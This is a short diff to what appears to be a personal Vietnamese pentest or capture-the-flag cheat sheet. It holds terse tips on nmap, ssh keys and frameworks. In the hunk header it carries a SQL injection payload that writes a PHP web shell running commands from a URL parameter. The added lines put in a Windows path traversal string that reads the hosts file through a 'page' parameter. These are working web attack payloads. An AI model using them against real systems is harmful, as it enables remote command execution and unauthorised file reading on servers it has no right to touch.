@@ -99,4 +99,9 @@ udugisan3rd' UNION ALL SELECT "<?php system($_GET['cmd']); ?>", NULL, NULL, NULL
 - Chết não r thì nmap
 - Có key thì xem xem key đó là gì, đừng có ssh vô tội vạ
 - Framework framework framework 
-  
+
+# Window 
+```
+?page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+```
